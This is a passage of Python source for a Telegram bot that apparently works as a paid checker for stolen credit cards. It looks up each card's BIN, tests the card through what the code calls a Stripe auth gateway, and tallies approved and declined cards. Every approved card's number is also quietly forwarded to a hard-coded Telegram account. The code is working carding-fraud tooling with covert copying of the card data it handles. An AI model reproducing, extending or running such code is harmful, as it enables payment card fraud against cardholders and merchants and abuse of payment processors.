                            os.remove('stop.stop')
                            return
                    try:
                        data = requests.get('https://bins.antipublic.cc/bins/' + cc[:6]).json()
                    except:
                        pass
                    try:
                        brand = data['brand']
                    except:
                        brand = 'Unknown'
                    try:
                        card_type = data['type']
                    except:
                        card_type = 'Unknown'
                    try:
                        country = data['country_name']
                        country_flag = data['country_flag']
                    except:
                        country = 'Unknown'
                        country_flag = 'Unknown'
                    try:
                        bank = data['bank']
                    except:
                        bank = 'Unknown'

                    start_time = time.time()
                    try:
                        # Call The Tele Function inside Gate.py
                        last = str(Tele(session, cc.strip()))
                    except Exception as e:
                        print(e)
                        last = "Error"
                    if 'Your card could not be set up for future usage.' in last:
                        last = 'Your card could not be set up for future usage.'
                    if 'Your card was declined.' in last:
                        last = 'Your card was declined.'
                    if 'success' in last:
                        last = 'APPROVED ✅'
                    if 'Card Expired' in last:
                        last = 'Your Card Expired'
                    if 'Live' in last:
                        last = 'APPROVED ✅'
                    if 'Unable to authenticate' in last:
                        last = 'Declined - Call Issuer'
                    elif 'Proxy error' in last:
                        last = 'Proxy error '
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
                    status = types.InlineKeyboardButton(f"• 𝐒𝐓𝐀𝐓𝐔𝐒  : {last} ", callback_data='u8')
                    cm3 = types.InlineKeyboardButton(f"• 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅ : [ {live} ] •", callback_data='x')
                    cm4 = types.InlineKeyboardButton(f"• 𝐅𝐀𝐊𝐄 𝐂𝐀𝐑𝐃 ⚠️ : [ {incorrect} ] •", callback_data='x')
                    cm5 = types.InlineKeyboardButton(f"• 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ❌ : [ {dd} ] •", callback_data='x')
                    cm6 = types.InlineKeyboardButton(f"• 𝐓𝐎𝐓𝐀𝐋 🎉       :  [ {total} ] •", callback_data='x') # Use updated total
                    stop = types.InlineKeyboardButton(f"[ 𝐒𝐓𝐎𝐏 🚫 ]", callback_data='stop')
                    mes.add(cm1, status, cm3, cm4, cm5, cm6, stop)
                    end_time = time.time()
                    execution_time = end_time - start_time
                    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''𝐖𝐚𝐢𝐭 𝐟𝐨𝐫 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠
𝐁𝐲 ➜ <a href='https://t.me/+bkxW-_IANZQ3YjY1'>Goku </a> ''', reply_markup=mes)
                    msg = f'''
<a href='https://envs.sh/smD.webp'>-</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>┏━━━━━━━━━━━⍟</a>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>┃</a>𝐂𝐂 <code>{cc}</code><a href='https://t.me/+bkxW-_IANZQ3YjY1'>┗━━━━━━━⊛</a>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: ⤿ 𝘚𝘛𝘙𝘐𝘗𝘌 𝘈𝘜𝘛𝘏 🟢 ⤾
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ⤿ Nice! New payment method added ✅ ⤾

<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐁𝐚𝐧𝐤: <code>{bank}</code>

<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐓𝐢𝐦𝐞: <code>{"{:.1f}".format(execution_time)} 𝐬𝐞𝐜𝐨𝐧𝐝</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: <a href='https://t.me/+bkxW-_IANZQ3YjY1'>Goku </a>'''
                    print(last)
                    if 'success' in last or '𝗖𝗛𝗔𝗥𝗚𝗘𝗗💰' in last or 'APPROVED ✅' in last or 'APPROVED ✅' in last or "Your card's security code is invalid." in last:
                        live += 1
                        bot.reply_to(message, msg)
                        bot.send_message(6658831303,msg)
                    elif 'Card Not Activated' in last:
                        incorrect+=1
                    elif '𝟯𝗗 𝗟𝗜𝗩𝗘 💰' in last:
                        msg = f'''
<a href='https://envs.sh/smD.webp'>-</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>┏━━━━━━━━━━━⍟</a>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>┃</a>𝐂𝐂 <code>{cc}</code><a href='t.me/addlist/u2A-7na8YtdhZWVl'>┗━━━━━━━⊛</a>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: ⤿ 𝘚𝘛𝘙𝘐𝘗𝘌 𝘈𝘜𝘛𝘏 🟢 ⤾
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ⤿ 𝘕𝘪𝘤𝘦! 𝘕𝘦𝘸 𝘱𝘢𝘺𝘮𝘦𝘯𝘵 𝘮𝘦𝘵𝘩𝘰𝘥 𝘢𝘥𝘥𝘦𝘥 ✅ ⤾

<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐁𝐚𝐧𝐤: <code>{bank}</code>

<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐓𝐢𝐦𝐞: <code>{"{:.1f}".format(execution_time)} 𝐬𝐞𝐜𝐨𝐧𝐝</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: <a href='https://t.me/+bkxW-_IANZQ3YjY1'>Goku </a>'''
                        live += 1
                        bot.reply_to(message, msg)
                        bot.send_message(6658831303,msg)
                    elif 'Card Not Activated' in last:
                        incorrect+=1
                    elif '𝗖𝗖𝗡/𝗖𝗩𝗩' in last or 'Your card has insufficient funds.' in last or 'tree_d' in last:
                        msg = f'''
<a href='https://envs.sh/smD.webp'>-</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>┏━━━━━━━━━━━⍟</a>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>┃</a>𝐂𝐂 <code>{cc}</code><a href='https://t.me/+bkxW-_IANZQ3YjY1'>┗━━━━━━━⊛</a>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: ⤿ 𝘚𝘛𝘙𝘐𝘗𝘌 𝘈𝘜𝘛𝘏 🟢 ⤾
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ⤿ 𝘕𝘪𝘤𝘦! 𝘕𝘦𝘸 𝘱𝘢𝘺𝘮𝘦𝘯𝘵 𝘮𝘦𝘵𝘩𝘰𝘥 𝘢𝘥𝘥𝘦𝘥 ✅ ⤾

<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐁𝐚𝐧𝐤: <code>{bank}</code>

<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐓𝐢𝐦𝐞: <code>{"{:.1f}".format(execution_time)} 𝐬𝐞𝐜𝐨𝐧𝐝</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: <a href='https://t.me/+bkxW-_IANZQ3YjY1'>Goku </a>'''
                        live += 1
                        bot.reply_to(message, msg)
                        bot.send_message(6658831303,msg)
                    elif 'Card Not Activated' in last:
                        incorrect += 1
                    else:
                        dd += 1
                    time.sleep(1)
            if str(user_id) != subscriber and checked_count > 0:
                bot.send_message(chat_id=message.chat.id, text=f"✅ 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞! Checked <code>{checked_count}</code> cards. 𝐂𝐫𝐞𝐝𝐢𝐭𝐬 𝐫𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠: <code>{get_user_credits(user_id)}</code>", parse_mode="HTML")


    except Exception as e:
        print(e)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=ko,
            text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @GOKUOFFICIALREAL_BOT'
        )


@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
  with open("stop.stop", "w") as file:
    pass
logop = f'''━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━bot by @GOKUOFFICIALREAL_BOT started sucessfully ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'''
print(logop)
bot.polling()